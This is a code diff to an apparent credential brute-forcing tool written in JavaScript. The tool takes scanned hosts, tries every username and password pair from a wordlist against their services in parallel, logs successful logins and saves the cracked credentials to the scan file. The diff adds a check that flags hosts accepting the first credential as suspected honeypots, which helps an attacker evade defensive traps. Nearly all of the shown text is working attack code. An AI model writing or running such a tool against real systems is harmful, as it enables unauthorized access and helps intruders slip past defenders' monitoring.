@@ -254,7 +254,8 @@ function parseWordlist(filePath) {
  * @returns {Promise<object>}  - Map of port → { user, pass, service } for successful logins
  */
 async function testHost(host, ports, credentials) {
-    const found = {};
+    const found      = {};
+    let honeypot     = false;
 
     for (const [portStr, portValue] of Object.entries(ports)) {
         const portNum = Number(portStr);
@@ -263,7 +264,8 @@ async function testHost(host, ports, credentials) {
 
         console.log(`  Testing ${host}:${portNum} [${service.toUpperCase()}]`);
 
-        let cracked = false;
+        let cracked      = false;
+        let attemptCount = 0;
 
         const tasks = credentials.map(({ user, pass }) => async () => {
             if (cracked) return;
@@ -275,18 +277,29 @@ async function testHost(host, ports, credentials) {
             if (service === "http")  success = await tryHTTP(host, portNum, user, pass, false);
             if (service === "https") success = await tryHTTP(host, portNum, user, pass, true);
 
+            attemptCount++;
+
             if (success) {
                 cracked = true;
                 process.stdout.write("\r\x1b[K");
-                console.log(`  HIT      ${host}:${portNum} [${service.toUpperCase()}] ${user}:${pass}`);
-                found[portStr] = { user, pass, service: service.toUpperCase() };
+
+                // First attempt succeeding is a strong honeypot indicator —
+                // real services rarely accept the very first credential tried
+                if (attemptCount === 1) {
+                    honeypot = true;
+                    console.log(`  HONEYPOT ${host}:${portNum} [${service.toUpperCase()}] accepted first credential ${user}:${pass}`);
+                    found[portStr] = { user, pass, service: service.toUpperCase(), honeypot: true };
+                } else {
+                    console.log(`  HIT      ${host}:${portNum} [${service.toUpperCase()}] ${user}:${pass}`);
+                    found[portStr] = { user, pass, service: service.toUpperCase() };
+                }
             }
         });
 
         await runPool(tasks, CRED_CONCURRENCY, () => {});
     }
 
-    return found;
+    return { found, honeypot };
 }
 
 // ================================================================
@@ -308,13 +321,13 @@ console.log(`Loaded ${scanResults.length} host(s), ${credentials.length} credent
 
 for (const hostEntry of scanResults) {
     console.log(`[ ${hostEntry.host} ]`);
-    const hits = await testHost(hostEntry.host, hostEntry.ports, credentials);
+    const { found, honeypot } = await testHost(hostEntry.host, hostEntry.ports, credentials);
 
-    if (Object.keys(hits).length > 0) {
-        // Merge successful credentials into the existing scan entry
-        hostEntry.credentials = hits;
+    if (Object.keys(found).length > 0) {
+        hostEntry.credentials = found;
+        if (honeypot) hostEntry.honeypot = "suspected — first credential accepted immediately";
         fs.writeFileSync(scanFile, JSON.stringify(scanResults, null, 2), "utf8");
-        console.log(`  → Saved credentials for ${hostEntry.host}\n`);
+        console.log(`  → Saved credentials for ${hostEntry.host}${honeypot ? " [HONEYPOT SUSPECTED]" : ""}\n`);
     } else {
         console.log(`  → No valid credentials found\n`);
     }
